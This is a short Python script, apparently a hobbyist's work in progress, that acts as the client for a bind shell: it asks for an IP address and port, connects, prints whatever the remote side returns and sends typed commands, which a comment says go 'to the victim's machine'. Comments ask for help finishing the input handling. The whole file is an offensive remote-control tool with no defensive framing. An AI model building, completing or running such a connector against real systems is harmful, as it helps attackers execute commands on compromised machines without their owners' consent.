import socket

print("Bind shell connector\n")

host = input("Type IP adress: ")
port = int(input("Type port to connect: "))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

while True:
	recv_output = s.recv(524288) # Might be very long, this is 512KB
	print(recv_output.decode())

	inp = input("$ ")
	if len(inp) <= 0:
		pass
	# Very incomplete part - help me with this
	# I want if I just enter something like space it won't send the command to.
	else:
		s.sendall(inp.encode()) # send command to the victim's machine
